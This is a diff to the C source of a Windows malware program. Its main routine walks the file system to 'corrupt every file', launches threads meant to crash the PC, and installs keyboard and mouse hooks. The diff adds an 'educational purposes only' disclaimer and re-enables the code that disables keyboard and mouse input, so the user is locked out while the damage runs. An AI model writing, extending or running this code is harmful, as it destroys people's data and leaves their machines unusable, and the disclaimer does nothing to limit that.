@@ -3,7 +3,15 @@
 #include "bombs.h"
 #include "file_corrupt.h"
 
+// DISCLAIMER:
 
+// Running the code for non-educational purposes is strongly discouraged. This file is intended for educational purposes only and may contain harmful or malicious code. 
+// Running it may tempoarily prevent your computer from working. It is recommended to use this file only for learning and understanding the concepts presented in the code. 
+//Any malicious use or distribution of this file is strictly prohibited.
+// By running this file, you acknowledge and agree that you are taking full responsibility for any damages or consequences that may result from its execution.
+// The creator assumes no responsibility for any harm caused by the code and disclaims any liability for any direct or indirect damages resulting from its execution.
+// Please refrain from using this file for any other purpose.
+// Thank you for your understanding.
 
 HHOOK hKeyboardHook;
 HHOOK hMouseHook;
@@ -53,16 +61,7 @@ void main() {
     //corrupt every file on the file system
     traverseDir();
 
-    //   DisableKeyboard();
-    // DisableMouse();
-
-    // // Message loop to keep the hooks active
-    // MSG msg;
-    // while (GetMessage(&msg, NULL, 0, 0)) {
-    //     TranslateMessage(&msg);
-    //     DispatchMessage(&msg);
-    // }
-
+  
 
     //start crashing the PC
     hThread1 = CreateThread(
@@ -83,6 +82,16 @@ void main() {
         &dwThreadId2
     );
 
+
+    DisableKeyboard();
+    DisableMouse();
+
+    // Message loop to keep the hooks active
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
 
     WaitForSingleObject(hThread1, INFINITE);
     WaitForSingleObject(hThread2, INFINITE);
